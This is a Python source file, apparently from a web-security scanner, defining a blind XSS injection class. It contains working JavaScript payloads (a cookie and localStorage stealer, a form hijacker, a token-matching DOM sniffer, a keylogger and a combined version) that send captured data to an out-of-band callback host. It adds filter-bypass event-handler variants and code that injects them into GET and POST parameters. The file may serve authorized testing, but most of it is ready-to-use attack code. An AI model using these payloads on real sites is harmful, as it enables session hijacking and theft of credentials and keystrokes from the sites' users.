"""
Blind XSS Payloads — OOB callback via interact.sh for stolen data exfiltration.

Payloads: cookie stealer, form hijacker, DOM extractor, keylogger, combined.
All phone home to {marker}.oast.site → OOB detector captures.
"""
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse


class BlindXSSHunter:
    """Generate + inject blind XSS payloads that exfiltrate via interact.sh."""

    def __init__(self, engine, interactsh_domain: str = "", session_manager=None):
        self.engine = engine
        self.domain = interactsh_domain
        self.session_manager = session_manager

    # JS templates (use .replace() for marker injection)

    _COOKIE_STEALER = """<script>
var d=document,c=d.cookie,l={};
try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(i)}}catch(e){}
new Image().src='__CB__/c?co='+encodeURIComponent(c)+'&ls='+encodeURIComponent(JSON.stringify(l))+'&u='+encodeURIComponent(d.URL)+'&r='+encodeURIComponent(d.referrer);
</script>"""

    _FORM_HIJACK = """<script>
var f=document.forms;
for(var i=0;i<f.length;i++){f[i].addEventListener('submit',function(e){var o={};new FormData(this).forEach(function(v,k){o[k]=v});new Image().src='__CB__/f?d='+encodeURIComponent(JSON.stringify(o))+'&u='+encodeURIComponent(document.URL);});}
</script>"""

    _DOM_SNIFFER = """<script>
var d=document,t=d.title,b=d.body?d.body.textContent.substring(0,500):'',m=d.cookie.match(/(token|session|auth|jwt|bearer|key|secret)=([^;]+)/i);
new Image().src='__CB__/d?t='+encodeURIComponent(t)+'&b='+encodeURIComponent(b)+'&m='+encodeURIComponent(m?m[0]:'none')+'&u='+encodeURIComponent(d.URL);
</script>"""

    _KEYLOGGER = """<script>
var b='',t=null;
document.addEventListener('keypress',function(e){b+=e.key;if(t)clearTimeout(t);t=setTimeout(function(){if(b.length>2)new Image().src='__CB__/k?k='+encodeURIComponent(b)+'&u='+encodeURIComponent(document.URL);b='';},2000);});
</script>"""

    _COMBINED = """<script>
var d=document,c=d.cookie,l={},b='',t=null;
try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(i)}}catch(e){}
var f=d.forms;for(var i=0;i<f.length;i++)f[i].addEventListener('submit',function(e){var o={};new FormData(this).forEach(function(v,k){o[k]=v});new Image().src='__CB__/x?ev=form&d='+encodeURIComponent(JSON.stringify(o));});
d.addEventListener('keypress',function(e){b+=e.key;if(t)clearTimeout(t);t=setTimeout(function(){if(b.length>2)new Image().src='__CB__/x?ev=key&k='+encodeURIComponent(b);b='';},2000);});
var m=c.match(/(token|session|auth|jwt|bearer|key|secret)=([^;]+)/i);
new Image().src='__CB__/x?co='+encodeURIComponent(c)+'&ls='+encodeURIComponent(JSON.stringify(l))+'&m='+encodeURIComponent(m?m[0]:'none')+'&t='+encodeURIComponent(d.title)+'&u='+encodeURIComponent(d.URL)+'&r='+encodeURIComponent(d.referrer);
</script>"""

    def _make_payload(self, template: str, marker: str) -> str:
        cb = "https://" + marker + "." + self.domain
        return template.replace("__CB__", cb)

    def cookie_stealer(self, marker: str) -> str: return self._make_payload(self._COOKIE_STEALER, marker)
    def form_hijacker(self, marker: str) -> str: return self._make_payload(self._FORM_HIJACK, marker)
    def dom_sniffer(self, marker: str) -> str: return self._make_payload(self._DOM_SNIFFER, marker)
    def keylogger(self, marker: str) -> str: return self._make_payload(self._KEYLOGGER, marker)
    def combined(self, marker: str) -> str: return self._make_payload(self._COMBINED, marker)

    # Filter-bypass payload variants

    def stored_xss_payloads(self, marker: str) -> list[str]:
        raw = self.combined(marker)
        js_body = raw.replace("<script>", "").replace("</script>", "")
        return [
            raw, '<img src=x onerror="' + js_body + '">',
            '<svg onload="' + js_body + '">',
            '<body onload="' + js_body + '">',
            '<input onfocus="' + js_body + '" autofocus>',
            '<details open ontoggle="' + js_body + '">',
            '<marquee onstart="' + js_body + '">',
            '<video><source onerror="' + js_body + '">',
            '&lt;script&gt;' + js_body + '&lt;/script&gt;',
        ]

    def reflected_probes(self, marker: str) -> list[str]:
        cb = "https://" + marker + "." + self.domain
        js = "new Image().src='" + cb + "/r?u='+encodeURIComponent(document.URL)"
        return [
            '<script>' + js + '</script>',
            '<img src=x onerror="' + js + '">',
            '<svg onload="' + js + '">',
            '"><script>' + js + '</script>',
            "';" + js + ";//",
        ]

    # Injection

    async def inject_stored(self, url: str, param: str, marker: str,
                             method: str = "GET", form_fields: dict = None) -> None:
        """Inject blind XSS payloads into a parameter. OOB callbacks collected by poll loop."""
        payloads = self.stored_xss_payloads(marker)
        for payload in payloads:
            try:
                if method == "GET":
                    parts = urlparse(url)
                    query = parse_qsl(parts.query, keep_blank_values=True)
                    found = False
                    for i, (k, v) in enumerate(query):
                        if k == param:
                            query[i] = (k, payload); found = True; break
                    if not found:
                        query.append((param, payload))
                    target = urlunparse((parts.scheme, parts.netloc, parts.path,
                                         urlencode(query), parts.fragment))
                    await self.engine.ahttp_send(target, timeout=5,
                                                  state_context=self.session_manager)
                elif method == "POST" and form_fields:
                    data = dict(form_fields)
                    data[param] = payload
                    await self.engine.ahttp_send(url, method="POST",
                                                  data=urlencode(data), timeout=5,
                                                  state_context=self.session_manager)
            except Exception:
                continue
